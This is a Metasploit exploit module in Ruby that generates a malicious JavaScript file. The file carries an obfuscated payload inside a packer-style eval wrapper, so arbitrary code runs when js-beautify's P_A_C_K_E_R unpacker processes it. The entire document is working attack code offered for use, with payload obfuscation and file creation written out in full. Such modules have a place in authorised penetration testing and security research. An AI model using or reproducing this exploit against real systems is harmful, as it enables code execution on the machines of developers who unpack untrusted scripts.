# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/jsobfu&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::JSObfu

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Javascript Injection for Eval-based Unpackers&#039;,
      &#039;Description&#039;    => %q{
        This module generates a Javascript file that executes arbitrary code
        when an eval-based unpacker is run on it. Works against js-beautify&#039;s
        P_A_C_K_E_R unpacker.
      },
      &#039;Author&#039;         => [ &#039;joev&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;  =>
        [
        ],
      &#039;Platform&#039;       => &#039;nodejs&#039;,
      &#039;Arch&#039;           => ARCH_NODEJS,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>  [[&#039;Automatic&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Feb 18 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([
      OptString.new(&#039;FILENAME&#039;, [true, &#039;The file name.&#039;, &#039;msf.js&#039;]),
      OptString.new(&#039;CUSTOM_JS&#039;, [false, &#039;Custom Javascript payload.&#039;])
    ], self.class)
  end

  def exploit
    p = js_obfuscate(datastore[&#039;CUSTOM_JS&#039;] || payload.encoded);
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file...")
    file_create("eval(function(p,a,c,k,e,r){}((function(){ #{p} })(),&#039;&#039;.split(&#039;|&#039;),0,{}))")
  end

end

